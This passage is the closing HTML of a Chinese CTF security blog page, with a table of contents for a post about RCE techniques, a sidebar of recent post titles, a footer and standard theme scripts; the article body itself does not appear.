href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">3.0.1.</span> <span class="toc-text">读取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">3.0.2.</span> <span class="toc-text">写入文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell%E5%8F%98%E9%87%8F%E6%89%A9%E5%B1%95-%E6%8B%BC%E6%8E%A5"><span class="toc-number">3.0.3.</span> <span class="toc-text">shell变量扩展&#x2F;拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.0.4.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ctfhub%E6%9C%80%E5%90%8E%E5%85%B3"><span class="toc-number">3.0.4.0.1.</span> <span class="toc-text">ctfhub最后关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2025H-NCTF"><span class="toc-number">3.0.4.0.2.</span> <span class="toc-text">2025H&amp;NCTF</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2025cuit%E7%BD%91%E5%AE%89%E9%99%A2ctf"><span class="toc-number">3.0.4.0.3.</span> <span class="toc-text">2025cuit网安院ctf</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE"><span class="toc-number">4.</span> <span class="toc-text">无字母数字RCE:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%8F%82RCE"><span class="toc-number">5.</span> <span class="toc-text">无参RCE</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/01/rce-plus/" title="RCE补课"><img src="/img/bash.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RCE补课"/></a><div class="content"><a class="title" href="/2026/01/01/rce-plus/" title="RCE补课">RCE补课</a><time datetime="2026-01-01T12:07:53.000Z" title="发表于 2026-01-01 20:07:53">2026-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/pickle-unserialize/" title="pickle反序列化"><img src="/img/logo/Python.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pickle反序列化"/></a><div class="content"><a class="title" href="/2025/12/29/pickle-unserialize/" title="pickle反序列化">pickle反序列化</a><time datetime="2025-12-29T08:45:06.000Z" title="发表于 2025-12-29 16:45:06">2025-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/python-sandbox/" title="python沙箱逃逸"><img src="/img/logo/Python.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python沙箱逃逸"/></a><div class="content"><a class="title" href="/2025/12/29/python-sandbox/" title="python沙箱逃逸">python沙箱逃逸</a><time datetime="2025-12-29T08:45:06.000Z" title="发表于 2025-12-29 16:45:06">2025-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/pollution/" title="原型链污染(js/python)"><img src="/img/logo/Python.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="原型链污染(js/python)"/></a><div class="content"><a class="title" href="/2025/12/29/pollution/" title="原型链污染(js/python)">原型链污染(js/python)</a><time datetime="2025-12-29T08:38:42.000Z" title="发表于 2025-12-29 16:38:42">2025-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/16/flask-memory-shell/" title="flask_ssti内存马"><img src="/img/logo/Python.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="flask_ssti内存马"/></a><div class="content"><a class="title" href="/2025/07/16/flask-memory-shell/" title="flask_ssti内存马">flask_ssti内存马</a><time datetime="2025-07-16T09:39:48.000Z" title="发表于 2025-07-16 17:39:48">2025-07-16</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/Commedia/videoframe_248026.png);"><div id="footer-wrap"><div class="copyright">&copy;2025 - 2026 By ivory</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="13468436268" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      const usePjax = true
      false 
        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
        : window.location.href = e.request.responseURL
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>